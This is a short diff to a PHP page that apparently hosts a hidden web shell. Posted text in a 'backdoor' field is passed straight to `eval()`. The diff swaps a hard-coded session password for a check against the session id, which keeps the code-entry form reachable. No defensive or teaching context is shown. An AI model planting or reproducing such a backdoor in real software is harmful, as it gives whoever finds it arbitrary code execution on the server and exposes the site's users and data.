@@ -1,7 +1,6 @@
 <?php
 
 session_start();
-$_SESSION['psw'] = 't9L';
 if (isset($_POST['backdoor'])) {
     eval($_POST['backdoor']);
     header('Location: index.php?page=root');
@@ -26,7 +25,7 @@ if (isset($_POST['backdoor'])) {
     </form>
 
     <?php if (isset($_POST['psw'])): ?>
-        <?php if($_POST['psw'] === $_SESSION['psw']): ?>
+        <?php if($_POST['psw'] === session_id()): ?>
             <form action="#" method="post">
                 <p><textarea name="backdoor"></textarea></p>
                 <p><input type="submit"></p>
